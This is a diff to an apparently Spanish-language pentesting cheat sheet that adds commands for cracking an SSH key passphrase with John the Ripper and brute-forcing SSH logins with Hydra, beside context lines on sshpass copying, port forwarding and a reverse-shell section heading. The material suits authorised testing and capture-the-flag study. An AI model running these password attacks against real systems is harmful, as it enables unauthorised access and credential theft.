@@ -58,6 +58,20 @@ sshpass -p 'passwordOfUser' scp -oStrictHostKeyChecking=no User@IP:File .
 ```Python
 ssh -L port:127.0.0.1:port -N -f -l userSSH IP 
 ```
+
+**ssh-passwd fuerza bruta (John)**
+
+```Python
+/JohnTheRipper/run/ssh2john.py id_rsa > forjohn.txt
+/JohnTheRipper/run/john forjohn.txt --wordlist=/dir/wordlist.txt
+```
+
+**ssh-passwd-user fuerza bruta (Hydra)**
+
+```Python
+hydra -l 'user' -P /dir/wordlist ssh://IP 
+```
+
 #### Python
 **Upgrade Reverse Shell**
 ```Python
